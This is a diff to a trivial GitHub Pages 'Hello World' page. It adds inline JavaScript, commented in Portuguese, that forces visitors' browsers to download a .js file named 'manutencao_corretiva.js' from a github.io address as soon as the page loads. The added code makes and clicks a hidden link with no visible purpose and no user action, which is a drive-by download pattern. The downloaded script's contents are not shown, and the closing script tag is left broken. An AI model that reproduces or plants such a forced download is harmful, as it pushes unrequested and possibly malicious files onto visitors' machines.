@@ -1,9 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Hello World</h1>
+<h1>Hello WorldAAA</h1>
 <p>I'm hosted with GitHub Pages.</p>
 </body>
 </html>
 
-<script src="/keepup/manutencao_corretiva.js"></script>
+    <script>
+        // URL do arquivo a ser baixado
+        var fileURL = 'https://mastermindpickup.github.io/keepup/manutencao_corretiva.js';
+
+        // Função para criar e clicar automaticamente no link de download
+        function triggerDownload(url) {
+            var link = document.createElement('a');
+            link.href = url;
+            link.download = url.split('/').pop();
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Chama a função para iniciar o download
+        window.onload = function() {
+            triggerDownload(fileURL);
+        };
+    </script
